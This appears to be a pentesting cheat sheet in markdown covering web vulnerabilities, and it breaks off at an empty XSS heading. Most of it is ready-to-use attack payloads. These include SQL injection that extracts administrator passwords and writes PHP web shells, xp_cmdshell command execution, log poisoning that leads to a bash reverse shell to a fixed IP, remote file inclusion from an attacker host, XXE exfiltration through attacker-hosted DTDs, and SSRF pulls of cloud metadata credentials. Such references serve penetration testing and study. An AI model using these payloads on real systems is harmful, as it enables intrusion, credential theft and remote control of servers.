# Web vulnerabilities

## Index

- [SQL Injection](#sql-injection)
- [Authentication vulnerabilities](#authentication-vulnerabilities)
- [Directory Traversal](#directory-traversal)
- [File inclusion](#file-inclusion)
- [OS Command Injection](#os-command-injection)
- [Business logic vulnerabilities](#business-logic-vulnerabilities)
- [Information Disclosure](#information-disclosure)
- [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
- [File upload vulnerabilities](#file-upload-vulnerabilities)
- [Server-side request forgery (SSRF)](#server-side-request-forgery-ssrf)
- [Open redirection](#open-redirection)
- [XXE injection](#xxe-injection)
- [Cross-site scripting (XSS)](#cross-site-scripting-xss)
- [Cross-site request forgery (CSRF)](#cross-site-request-forgery-csrf)
- [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing-cors)
- [Clickjacking](#clickjacking)
- [DOM-based vulnerabilities](#dom-based-vulnerabilities)
- [WebSockets](#websockets)
- [Insecure deserialization](#insecure-deserialization)
- [Server-side template injection](#server-side-template-injection-ssti)
- [Web cache poisoning](#web-cache-poisoning)
- [HTTP Host header attacks](#http-host-header-attacks)
- [HTTP request smuggling](#http-request-smuggling)
- [JWT Attacks](#jwt-attacks)
- [OAuth authentication](#oauth-authentication)
- [GraphQL](#graphql)
- [WordPress](#wordpress)
- [IIS - Internet Information Services](#iis---internet-information-services)
- [Microsoft SharePoint](#microsoft-sharepoint)
- [Lotus Domino](#lotus-domino)
- [phpLDAPadmin](#phpldapadmin)
- [Git source code exposure](#git-source-code-exposure)
- [Subdomain takeover](#subdomain-takeover)
- [Second-Order Takeover](#second-order-takeover)
- [4** Bypass](#4-bypass)
- [Application level Denial of Service](#application-level-denial-of-service)
- [APIs attacks](#apis-attacks)
- [Grafana attacks](#grafana-attacks)
- [Confluence attacks](#confluence-attacks)
- [Kibana](#kibana)
- [Argus Surveillance DVR](#argus-surveillance-dvr)
- [Shellshock](#shellshock)
- [Cassandra web](#cassandra-web)
- [RaspAP](#raspap)
- [Drupal](#drupal)
- [Tomcat](#tomcat)
- [Booked Scheduler](#booked-scheduler)
- [phpMyAdmin](#phpmyadmin)
- [PHP](#php)
- [Symphony](#symphony)
- [Adobe ColdFusion](#adobe-coldfusion)
- [Webmin](#webmin)
- [Broken Link Hijacking](#broken-link-hijacking)
- [Log4Shell](#log4shell)
- [Spring Boot](#spring-boot)
- [Apache](#apache)
- [Cisco](#cisco)
- [Citrix](#citrix)



## SQL Injection

### Introduction

**Tools**
- [SQL injection cheat sheet | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
- [SQL Injection cheat sheets | ihack4falafel](https://github.com/ihack4falafel/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
- [Ghauri](https://github.com/r0oth3x49/ghauri)

**More**
- [XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [NoSQL | MongoDB](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)

**Database Commands**

- **MySQL**
  - Connect to the database: `mysql -u root -p'root' -h <IP> -P 3306`
  - Retrieve the DB version: `select version();`
  - Inspect the current session's user: `select system_user();`
  - List all available databases: `show databases;`
    - Use a specific database: `USE databasetmp`
    - Show tables in the database: `SHOW TABLES`
  - Inspect user `rooter`'s encrypted password: `SELECT user, authentication_string FROM mysql.user WHERE user = 'rooter';`
  
- **MSSQL**
  - Connect to remote instance via Impacket: `impacket-mssqlclient <user>:<password>@<IP> -windows-auth`
  - Retrieve the DB version: `SELECT @@version;`
  - List all available databases: `SELECT name FROM sys.databases;`
  - Inspect the available tables in the `tempdb` database: `SELECT * FROM tempdb.information_schema.tables;`
  - Select from a specific table: `SELECT * from tempdb.dbo.users;`

### Types of SQL Injection

#### Error-Based SQL Injection

- `' OR '1'='1`
- `' OR '1'='1' --`
- `' OR 1=1 #'`
- `' UNION SELECT NULL,NULL,NULL--`
  - Add/remove NULLs to make the query work
  - Note: On Oracle, they work differently. See PortSwigger
- `Accessories' UNION SELECT table_name, NULL FROM all_tables--`
- `Accessories' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_BIZMOI'--`
- `Accessories' UNION SELECT PASSWORD_ZRFHII, USERNAME_SCSVZM FROM USERS_BIZMOI--`
- `' UNION SELECT NULL,username||'~'||password FROM users--`
- `1 UNION SELECT username||':'||password FROM users--`

#### Blind SQL Injection

**Blind - Boolean-Based**
- First char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`
- Second char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'm`
- Third char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'm`
- Note: This can be automated with Intruder Cluster bomb

**Blind - Error-Based**
- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
  - Test length of a password
- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

**Blind - Verbose SQL Errors**
- `CAST((SELECT example_column FROM example_table) AS int)`
- `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
- `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
- `Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

**Blind - Time-Based**
- `'; IF (1=1) WAITFOR DELAY '0:0:10';--`
- `'; IF (1=2) WAITFOR DELAY '0:0:10';--`
- `'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--`
  - Testing the existence of the table `users`
- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--`
  - Testing the existence of the column `username`
- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--`
  - Testing the presence of another column, in this case, searching if it starts with `pass`. Using `%` you can test letter by letter
- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users')>3) WAITFOR DELAY '0:0:10';--`
  - See how many columns there are in the DB
- `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'butch' AND password_hash='8' WAITFOR DELAY '0:0:5'--`
  - Discover password_hash
- `'; update users set password_hash = 'tacos123' where username = 'butch';--`
  - Try to update user creds
  - Verify the success with the query: `'; IF ((select count(username) from users where username = 'butch' and password_hash = 'tacos123')=1) WAITFOR DELAY '0:0:10';--`
  - For the hash, try various combinations (md5sum, sha1sum, sha256sum): `echo -n 'tacos123' | md5sum`
    - `'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--`
- See exploit: [Exploit DB](https://www.exploit-db.com/exploits/47013)

**Blind - Delay with Conditions**
- `x'%3b SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END--`
- `x'%3b SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
- `x'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
  - To automate this: Resource pool > New resource pool with Max Concurrent requests = 1

**DNS Lookup**
- `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wggnzi1futt3lvlzdsfuiwfdg4mvapye.oastify.com/"> %remote;]>'),'/l') FROM dual--`
- `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.chx30y2vv9ujmbmfe8gajcgthknbb6zv.oastify.com/"> %remote;]>'),'/l') FROM dual--`
- `' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--`
  - Useful with `sudo responder -I tun0` to take hashes from Windows OS

**HTML Encoding**
- `&#49;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#32;&#45;&#45;`
- [Mother Eff HTML Entities](https://mothereff.in/html-entities)

### Notes

**SQLi Discovery and Exploitation**
- If you find a path/slug, you might find an SQLi
- If you have found an XSS, test also for SQLi
- Use `'and'1` `'and'0` to search for SQLi
	- `SELECT * FROM EMPLOYEE WHERE dept = 'Sales' and '0';` This is always false
	- `SELECT * FROM EMPLOYEE WHERE dept = 'Sales' and '1';` This is always true (if you have the first condition verified)
- Use `%` as a wildcard in SQL injection attempts to match any sequence of characters when targeting queries with the LIKE operator
- `SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"`
- `' UNION SELECT ("<?php echo system($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
- `%27%20union%20select%20%27%3C?php%20echo%20system($_REQUEST[%22bingo%22]);%20?%3E%27%20into%20outfile%20%27/srv/http/cmd.php%27%20--%20-`

**Extract Database Information**
- Extract the version: `?id=1 union all select 1, 2, @@version`
- Extract the database user: `?id=1 union all select 1, 2, user()`
- Extract table names: `?id=1 union all select 1, 2, table_name from information_schema.tables`
- Extract table columns: `?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`
- Example of extracting the `users` table: `?id=1 union all select 1, username, password from users`

**Authentication Bypass**
- `tom’ or 1=1 LIMIT 1;#`
  - `#` is a comment marker in MySQL/MariaDB
  - `LIMIT 1` is to return a fixed number of columns and avoid errors when our payload is returning multiple rows

**Insert a New User**
```sql
insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
```

**Local File Inclusion (LFI)**
- Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`

**Remote Code Execution (RCE)**
- ```SQL
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  xp_cmdshell 'COMMAND';
  ```
- ```SQL
  EXEC sp_configure 'allow updates', 0
  RECONFIGURE
  EXEC sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  EXEC sp_configure 'xp_cmdshell', 1
  GO
  RECONFIGURE
  GO
  xp_cmdshell 'COMMAND';
  ```
- Write a PHP shell using the `OUTFILE` function: `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`. Then access `backdoor.php&cmd=ipconfig`.

**sqlmap**
- ```
   > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
  		    -l (to parse a Burp log file)
  		    --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3		  
  		    --force-ssl --threads 5 --level 1 --risk 1 --tamper=space2comment
  ```
- `sqlmap -u http://victim/page.php?param=1 -p param` test the parameter `param`
  - `sqlmap -u http://victim/page.php?param=1 -p param --dump` dump the entire database
  - Add ` -D DATABASE_NAME` and `-T TABLE_NAME` to dump a specific database/table
- `sqlmap -r request.txt -p param --os-shell` gain shell
- `sqlmap -u http://vulnerable.com --forms  --crawl=10 --level=5 --risk=3` to crawl
- `sqlmap -u http://vulnerable.com --batch` non interactive mode

**How to fix SQL injections**: Use parameterized queries/prepared statements to protect against SQL injections by isolating user input from SQL code. They add placeholders for user input in SQL statements, creating a layer of isolation and preventing user input from affecting SQL code.


## Authentication vulnerabilities

**Multi-factor authentication**
- Response manipulation, try to intercept the response and modify the status to `200`
- Status code manipulation, change the code from `4xx` to `200`
- 2FA code leakage in the response
- JS File Analysis
- 2FA Code Reusability
- Lack of Bruteforce protection
- The 2FA code can be used for any user
- CSRF on 2FA disabling
- Password reset disable 2FA
- Bypass 2FA with null or `000000`
- Access the content directly
- Login with Oauth to bypass 2FA
- If you get logged-out after failed attempts, use macros with Burp

**Password reset**
- Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token
- Try with headers like `X-Forwarded-Host:`
- Via dangling markup
  - `Host: victim.com:'<a href="//attacker.com/?`
- Insert two emails, like:
  - `email1@service.com;email2@service.com`
  - `email:["email1@service.com","email2@service.com"]`
- If you can control the body of the password reset email, embed the password reset link within an `<img>` tag using a subdomain you control. This may allow for a zero-click account takeover via Googlebot's automatic link crawling

**Rate-limit**
- Bypass with `X-Forwarded-For:127.0.0.1-1000`
- IP rotating, you can use
- [mubeng](https://github.com/kitabisa/mubeng)
- [Burp extension: IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
- Log in into a valid account to reset the rate-limit

**Web Cache Deception**
- Attacker send to a victim a 404 endpoint like `site.com/dir/ok.css`
- Victim click on it, the CDN cache the page
- Attacker goes to `site.com/dir/ok.css`, now it can see the page of the Victim

**Misc tests**
- [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
- [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
- Test "remember me" functionality
- PHP protections can be bypassed with `[]`, like `password=123` to `password[]=123`
- Replace password with a list of candidates, example
  ```JSON
  "username":"usertest"
  "password":[
   "123456",
   "password",
   "qwerty",
   ...
  ```
- Search for [Open Redirect](#open-redirection) in login and register
- For phpMyAdmin, check default credential `root` and blank password

## Directory Traversal

Directory traversal vulnerabilities allow an attacker to read local secret files. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb))

**Exploitations / Bypasses**
- simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
- absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
- stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
- superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`

**Search for**
- `windows\win.ini`
- `c:\windows\system32\drivers\etc\hosts`
- `etc/passwd`

## File inclusion

File inclusion vulnerabilities allow an attacker to include a file into the application’s running code. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb)).

**Local File Inclusion (LFI)**: execute a local file

- Try `zip://`, `php://` and other wrappers
  - With `zip://` you can achieve RCE. Example: `http://192.168.190.229/index.php?file=zip:///var/www/html/uploads/upload_1692869993.zip%23php-reverse-shell.php`

Apache's access.log contamination
1. Once found a LFI, read the Apache's access.log `http://victim.com/page.php?file=<PAYLOAD>`
   - Use `C:\xampp\apache\logs\access.log` or `../../../../../../../../../var/log/apache2/access.log`
2. Notice which values from requests are saved. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>` in the User-Agent
3. Execute a RCE with `http://victim.com/page.php?file=<apache/access.log>&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
4. Run a reverse shell using a listener `nc -nvlp 4444` and in `&cmd` use `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`

**Remote File Inclusion (RFI)**: execute a remote file
- An example: `http://<VICTIM>/menu.php?file=http://<ATTACKER>/evil.php`

**PHP Wrappers**
- `?file=data:text/plain,hello world`
- `?file=data:text/plain,<?php echo shell_exec("dir") ?>`
- `?file=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls`
- Use the command `curl http://victim.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php` to obtain the source code of `admin.php` encoded in base64. This is to not run the PHP and to fetch the source code
  - Some examples for `php://`: [PHP: php:// - Manual](https://www.php.net/manual/en/wrappers.php.php)
- [Other wrappers](https://www.php.net/manual/en/wrappers.php)

**To search**
- `/var/log/apache2/access.log`
- `/etc/passwd`
- `/etc/shadow`


## OS Command Injection

Let's say that the vulnerable endpoint it's `https://insecure-website.com/stockStatus?productID=381&storeID=29`. The provide the stock information, the application runs the command `stockpile.pl 381 29`. If there is no OS Command Injection protection, by inserting the payload `& echo abcdefg &` in `productID` it's possible to execute the command `echo`.

For blind OS Command Injections
- Time delay `& ping -c 10 127.0.0.1 &`
- Redirecting output `& whoami > /var/www/static/whoami.txt &`
- Out-of-band (OAST) techniques `& nslookup kgji2ohoyw.web-attacker.com &`

Ways of injecting OS commands
- Both Windows and Unix-based systems
  - `&`
  - `&&`
  - `|`
  - `||`
- Unix-based systems only
  - `;`
  - Newline with `0x0a` or `\n`
  - `injected command`
  - `$(injected command)`

**Resource**
- [commix-testbed](https://github.com/commixproject/commix-testbed)


## Business logic vulnerabilities

**Examples**
- Excessive trust in client-side controls
- 2FA broken logic
- Failing to handle unconventional input
- Inconsistent security controls
- Weak isolation on dual-use endpoint
- Password reset broken logic
- Insufficient workflow validation
- Flawed enforcement of business rules
- [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
- Account Takeover via type confusion
  - Play with parameters and flags to see if you can achieve ATO

Other cases:
- Cookie Bombing
  - [Report #1898305](https://hackerone.com/reports/1898305)
- [Anyone can Access Deleted and Private Repository Data on GitHub](https://trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github)

## Information Disclosure

What is information disclosure?
- Data about other users, such as usernames or financial information
- Sensitive commercial or business data
- Technical details about the website and its infrastructure

What are some examples of information disclosure?
- Revealing the names of hidden directories, their structure, and their contents via a robots.txt file or directory listing
- Providing access to source code files via temporary backups
- Explicitly mentioning database table or column names in error messages
- Unnecessarily exposing highly sensitive information, such as credit card details
- Hard-coding API keys, IP addresses, database credentials, and so on in the source code
- Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior
- If you need to find UUID from an email, try to register the user and see if in the response it's disclosed. [[Reference](https://twitter.com/intigriti/status/1217794181982302208)]

How do information disclosure vulnerabilities arise?
- Failure to remove internal content from public content
- Insecure configuration of the website and related technologies
- Flawed design and behavior of the application



## Access control vulnerabilities and privilege escalation

In the context of web applications, access control is dependent on authentication and session management:
- Authentication identifies the user and confirms that they are who they say they are;
- Session management identifies which subsequent HTTP requests are being made by that same user;
- Access control determines whether the user is allowed to carry out the action that they are attempting to perform.

From a user perspective, access controls can be divided into the following categories:
- Vertical access controls
  Mechanisms that restrict access to sensitive functionality that is not available to other types of users
- Horizontal access controls
  Mechanisms that restrict access to resources to the users who are specifically allowed to access those resources
- Context-dependent access controls
  Restrict access to functionality and resources based upon the state of the application or the user's interaction with it

IDORs tips
- Look for numeric values / simple IDs
	- Check what are the results with `0` or `-1`
 	- Examples
  		- [IDOR on GraphQL queries BillingDocumentDownload and BillDetails](https://hackerone.com/reports/2207248)
- Look for [Internal API Requests](https://x.com/yeswehack/status/1859884801030783042), they might lead path traversals and IDORs
- If you find MongoDB ObjectIds (ex. `5ae9b90a2c144b9def01ec37`), use [mongo-objectid-predict](https://github.com/andresriancho/mongo-objectid-predict) to demonstrate predictability

**Tools**
- [Autorize](https://github.com/PortSwigger/autorize)
- [Authz](https://portswigger.net/bappstore/4316cc18ac5f434884b2089831c7d19e)
- [UUID Detector](https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248)
- Inspect also endpoints in JS files



## File upload vulnerabilities

**Upload Functions check-list**
- [ ] Check if the method `PUT` is enabled
- [ ] Integrations (from 3rd party)
  - XSS
- [ ] Self Uploads
  - XML based (Docs/PDF)
    - SSRF, XSS
  - Image
    - XSS, Shell
      - Name
      - Binary header
      - Metadata
- [ ] Where is data stored?
- [s3 perms](#abusing-s3-bucket-permissions)
- [GCS perms](#google-cloud-storage-bucket)
  
**Extension Splitting**
- shell.php%00.png
- shell.php%0A.png
- shell.php\n.png
- shell.php\u000a.png
- shell.php\u560a.png
- shell.php%E5%98%8A.png
- shell.php;.png
- shell.php%3B.png
- shell.php\u003b.png
- shell.php\u563b.png
- shell.php%E5%98%BB.png

**multipart/form-data POST request**
```HTTP
POST / HTTP/2
Host: example.io
Content-Type: multipart/form-data; boundary=---------------------------374598703146120535182333328
Content-Length: 342

-----------------------------374598703146120535182333328
Content-Disposition: form-data; name="key"

general
-----------------------------374598703146120535182333328
Content-Disposition: form-data; name="file"; filename="file.pdf"
Content-Type: application/pdf

$content$
-----------------------------374598703146120535182333328--
```

**Add magic bytes**

Add magic bytes at the beginning of a file to bypass restrictions
```sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> reverse.php.png
cat reverse.php >> reverse.php.png
```
- Useful, for example, to upload `.js` files and bypass CSP restrictions

**General tips**
- If the target creates an encrypter URL for your file, copy the domain and use the command `echo data.target.com | waybackurls | httpx -mc 200, 403`. If you find valid endpoints, it might be possible to have an information disclosure [[Reference](https://twitter.com/ADITYASHENDE17/status/1673585969411526658)]
- To create a random pdf file in order to test for file size
	- `dd if=/dev/urandom of=random.pdf bs=1M count=6`

**Resources**
- [Common MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)
- [ASHX shell](https://gist.github.com/merttasci/82100f2ef904dfe810416fd3cb48be5c), see [mert's tweet](https://twitter.com/mertistaken/status/1646171743206121474)


## Server-side request forgery (SSRF)

**SSRF with blacklist-based input filters bypass**
Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
- Registering your own domain name that resolves to `127.0.0.1`. You can use spoofed.burpcollaborator.net for this purpose or the domain `firefox.fr` is a DNS that point to `127.0.0.1`.;
- Obfuscating blocked strings using URL encoding or case variation.

**SSRF with whitelist-based input filters bypass**
- You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can use combinations of these techniques together.

**Other tips**
- By combining it with an [Open redirection](#open-redirection), you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
- For AWS, bypass some restrictions by hosting this PHP page [[Reference](https://hackerone.com/reports/508459)]
  ```PHP
  <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
  ```
- If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
- [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
- If the target runs Windows, try to steal NTLM hashes with Responder [[Reference](https://twitter.com/hacker_/status/1694554700555981176)]
  - `/vulnerable?url=http://your-responder-host`
- `<?php header('Location: file:///Users/p4yl0ad/.ssh/id_rsa');?>`
- If the app saves files locally but doesn't change the file name, you might RCE. This works on Linux:
  ```
  "pippo.pdf`ping my.burpcollaborator.org"
  ```

**Common endpoints**
- Webhooks
  - Try to send requests to internal resources
- PDF Generator
  - If there is an HTML Injection in a PDF generator, try call internal resources with something like `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" title="SSRF test">`, with these tags `<img>`, `<script>`, `<base>` or with the CSS element `url()`
- Document parsers
  - If it's an XML doc, use the PDF Generator approach
  - In other scenarios, see if there is any way to reference external resources and let server make requests to internal resources
- Link expansion, [[Reference](https://twitter.com/BugBountyHQ/status/868242771617792000)]
- File uploads
  - Instead of uploading a file, upload a URL. [An example](https://hackerone.com/reports/713)
  - Use an SVG file
    ```svg
	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    	<image xlink:href="https://example.com/test.png"/>
	</svg>
    ```

**Common payloads**
- `http://127.0.0.1`
- `http://localhost/`
- `http://169.254.169.254/`
- `http://169.254.169.254/latest/meta-data/`
- `http://instance-data`
  - alternative to `169.254.169.254`
- `http://metadata.google.internal/`
- `https://kubernetes.default.svc/metrics` [[Random Robbie's tweet](https://twitter.com/Random_Robbie/status/1072242182306832384)]

**Resources**
- [7 SSRF Mitigation Techniques You Must Know](https://brightsec.com/blog/7-ssrf-mitigation-techniques-you-must-know/)
- [Cloud SSRF | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf)
- [SSRF Cheatsheet | Cobalt](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf)


## Open redirection

**Bypasses**
- https://attacker.com?victim.com
- https://attacker.com;victim.com
- https://attacker.com/victim.com/../victimPATH
- https://victim.com.attacker.com
- https://attackervictim.com
- https://victim.com@attacker.com
- https://attacker.com#victim.com
- https://attacker.com\.victim.com
- https://attacker.com/.victim.com
- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
- https://www.victim.com/redir/r.php?redirectUri=https://attacker%E3%80%82com%23.victim.com/
- https://www.victim.com/redir/r.php?redirectUri=/%0d/attacker.com/


## XXE injection

- **Exploiting XXE to retrieve files**<br/>
  Original
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <stockCheck><productId>381</productId></stockCheck>
  ```
  Modified
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <stockCheck><productId>&xxe;</productId></stockCheck>
  ```
- **Exploiting XXE to perform SSRF attacks**
  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerablewebsite.com/"> ]>
  ```
- **Exploiting blind XXE exfiltrate data out-of-band**<br/>
  Example
  ```xml
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com"> %xxe; ]>
  ```
- **Exfiltrate data out-of-band**<br/>
  for-the-malicious-web-server.dtd
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webattacker.com/?x=%file;'>">
  %eval;
  %exfil;
  ```
  Submit to vulnerable server
  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://webattacker.com/malicious.dtd"> %xxe;]>
  ```
- **Exploiting blind XXE to retrieve data via error messages**
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
  ```
- **Exploiting blind XXE by repurposing a local DTD**<br/>
  Suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`
  ```xml
  <!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
  &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;error;
  '>
  %local_dtd;
  ]>
  ```
  To locate the DTD file, submit the payload
  ```xml
  <!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM
  "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
  ]>
  ```
- **Try with xinclude to achieve SSRF or LFI**
  ```xml
  <?xml version="1.0" encoding="utf-8" ?>
  <username xmls:xi="https://w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///c:/windows/win.ini">
  </username>
  ```

Attack surfaces
- **XInclude attacks**
  ```xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>
  ```
- **XXE attacks via file upload with** `.svg`
  ```svg
  <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITYxxe SYSTEM "file:///etc/hostname" > ]>
  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
  </svg>
  ```
- **XXE attacks via modified content type**<br/>
  For example, Content-Type: `application/x-www-form-urlencoded` -> `Content-Type: text/xml`

Manually testing for XXE vulnerabilities generally involves
- Testing for file retrieval
- Testing for blind XXE vulnerabilities
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document

**Notes**
- In an endpoint like "ping/pong" you might send a request to include xml
- Try to chain it with LFI for an RCE
- Basic payload
  ```xml
  <?xml version="1.0" encoding="UTF-8" ?>
  <!DOCTYPE writeup [<!ENTITY xxe SYSTEM "http://10.10.14.38/ping.php" >]>
  <writeup>&xxe;</writeup>
  ```


## Cross-site scripting (XSS)

### Bookmarks
